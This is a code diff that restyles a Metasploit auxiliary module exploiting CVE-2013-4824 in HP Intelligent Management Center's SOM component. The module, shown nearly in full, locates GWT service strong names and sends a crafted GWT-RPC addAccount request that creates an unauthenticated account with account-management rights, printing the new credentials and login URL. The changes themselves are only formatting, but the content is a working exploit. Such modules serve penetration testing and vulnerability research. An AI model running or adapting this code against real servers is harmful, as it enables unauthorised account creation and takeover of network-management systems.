@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,69 +7,64 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'HP Intelligent Management SOM Account Creation',
-      'Description'    => %q{
-        This module exploits a lack of authentication and access control in HP Intelligent
-        Management, specifically in the AccountService RpcServiceServlet from the SOM component,
-        in order to create a SOM account with Account Management permissions. This module has
-        been tested successfully on HP Intelligent Management Center 5.2 E0401 and 5.1 E202 with
-        SOM 5.2 E0401 and SOM 5.1 E0201 over Windows 2003 SP2.
-      },
-      'References'     =>
-        [
-          [ 'CVE', '2013-4824' ],
-          [ 'OSVDB', '98249' ],
-          [ 'BID', '62902' ],
-          [ 'ZDI', '13-240' ],
-          [ 'URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03943547' ]
-        ],
-      'Author'         =>
-        [
-          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery
-          'juan vazquez' # Metasploit module
-        ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => "Oct 08 2013"
-    ))
+                      'Name'           => 'HP Intelligent Management SOM Account Creation',
+                      'Description'    => %q(
+                        This module exploits a lack of authentication and access control in HP Intelligent
+                        Management, specifically in the AccountService RpcServiceServlet from the SOM component,
+                        in order to create a SOM account with Account Management permissions. This module has
+                        been tested successfully on HP Intelligent Management Center 5.2 E0401 and 5.1 E202 with
+                        SOM 5.2 E0401 and SOM 5.1 E0201 over Windows 2003 SP2.
+                      ),
+                      'References'     =>
+                        [
+                          [ 'CVE', '2013-4824' ],
+                          [ 'OSVDB', '98249' ],
+                          [ 'BID', '62902' ],
+                          [ 'ZDI', '13-240' ],
+                          [ 'URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03943547' ]
+                        ],
+                      'Author'         =>
+                        [
+                          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery
+                          'juan vazquez' # Metasploit module
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'DisclosureDate' => "Oct 08 2013"))
 
     register_options(
       [
         Opt::RPORT(8080),
         OptString.new('USERNAME', [true, 'Username for the new account', 'msf']),
         OptString.new('PASSWORD', [true, 'Password for the new account', 'p4ssw0rd'])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def get_service_desk_strong_name
-    res = send_request_cgi({
-      'uri'    => normalize_uri("servicedesk", "servicedesk", "servicedesk.nocache.js"),
-      'method' => 'GET'
-    })
+    res = send_request_cgi('uri' => normalize_uri("servicedesk", "servicedesk", "servicedesk.nocache.js"),
+                           'method' => 'GET')
 
-    if res and res.code == 200 and res.body =~ /unflattenKeylistIntoAnswers\(\['default', 'safari'\], '([0-9A-Fa-f]+)'\);/
-      return $1
+    if res && (res.code == 200) && res.body =~ /unflattenKeylistIntoAnswers\(\['default', 'safari'\], '([0-9A-Fa-f]+)'\);/
+      return Regexp.last_match(1)
     end
 
-    return nil
+    nil
   end
 
   def get_account_service_strong_name(service_desk)
-    res = send_request_cgi({
-      'uri'    => normalize_uri("servicedesk", "servicedesk", "#{service_desk}.cache.html"),
-      'method' => 'GET'
-    })
+    res = send_request_cgi('uri' => normalize_uri("servicedesk", "servicedesk", "#{service_desk}.cache.html"),
+                           'method' => 'GET')
 
-    if res and res.code == 200 and res.body =~ /'accountSerivce.gwtsvc', '([0-9A-Fa-f]+)', SERIALIZER_1/
-      return $1
+    if res && (res.code == 200) && res.body =~ /'accountSerivce.gwtsvc', '([0-9A-Fa-f]+)', SERIALIZER_1/
+      return Regexp.last_match(1)
     end
 
-    return nil
+    nil
   end
 
   def report_cred(opts)
@@ -98,7 +94,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-
     print_status("Trying to find the service desk service strong name...")
     service_desk = get_service_desk_strong_name
     if service_desk.nil?
@@ -115,12 +110,12 @@ class MetasploitModule < Msf::Auxiliary
     end
     print_good("AccountService strong number found: #{account_service}")
 
-    header= "6|0|39" # version | unknown | string_table size
+    header = "6|0|39" # version | unknown | string_table size
 
     # Used to parse the payload
     string_table = [
       "http://localhost:8080/servicedesk/servicedesk/",                         # 1  servlet URL
-      "#{account_service}",                                                     # 2  AccountService strong name
+      account_service.to_s,                                                     # 2  AccountService strong name
       "com.h3c.imc.eu.client.account.AccountService",                           # 3  GWT Service Class
       "addAccount",                                                             # 4  GWT Service Method
       "com.extjs.gxt.ui.client.data.BaseModelData/3541881726",                  # 5  BaseModelData Type
@@ -220,9 +215,9 @@ class MetasploitModule < Msf::Auxiliary
       "10", # address Type (String)
       "35", # address Value ("")
       "36", # RpcMap[12] => phone
-      "-19",# phone Type - not provided
+      "-19", # phone Type - not provided
       "37", # RpcMap[13] => email
-      "-19",# email Type - not provided
+      "-19", # email Type - not provided
       "38", # RpcMap[14] => userAppendInfo
       "39", # userAppendInfo Type (HashMap)
       "0"   # userAppendInfo HashMap size (0)
@@ -234,25 +229,23 @@ class MetasploitModule < Msf::Auxiliary
     service_url = ssl ? "https://" : "http://"
     service_url << "#{rhost}:#{rport}/servicedesk/servicedesk/"
 
-    print_status("Trying to create account #{datastore["USERNAME"]}...")
-    res = send_request_cgi({
-      'method' => 'POST',
-      'uri'    => normalize_uri("servicedesk", "servicedesk", "accountSerivce.gwtsvc"),
-      'ctype'  => 'text/x-gwt-rpc; charset=UTF-8',
-      'headers' => {
-        "X-GWT-Module-Base" => service_url,
-        "X-GWT-Permutation" => "#{service_desk}"
-      },
-      'data'   => gwt_request
-    })
+    print_status("Trying to create account #{datastore['USERNAME']}...")
+    res = send_request_cgi('method' => 'POST',
+                           'uri'    => normalize_uri("servicedesk", "servicedesk", "accountSerivce.gwtsvc"),
+                           'ctype'  => 'text/x-gwt-rpc; charset=UTF-8',
+                           'headers' => {
+                             "X-GWT-Module-Base" => service_url,
+                             "X-GWT-Permutation" => service_desk.to_s
+                           },
+                           'data' => gwt_request)
 
-    unless res and res.code == 200
+    unless res && (res.code == 200)
       print_error("Unknown error while creating the user.")
       return
     end
 
     if res.body =~ /Username.*already exists/
-      print_error("The user #{datastore["USERNAME"]} already exists.")
+      print_error("The user #{datastore['USERNAME']} already exists.")
       return
     elsif res.body =~ /Account.*added successfully/
       login_url = ssl ? "https://" : "http://"
@@ -267,9 +260,8 @@ class MetasploitModule < Msf::Auxiliary
         proof: "#{login_url}\n#{res.body}"
       )
 
-      print_good("Account #{datastore["USERNAME"]}/#{datastore["PASSWORD"]} created successfully.")
+      print_good("Account #{datastore['USERNAME']}/#{datastore['PASSWORD']} created successfully.")
       print_status("Use it to log into #{login_url}")
     end
   end
-
 end
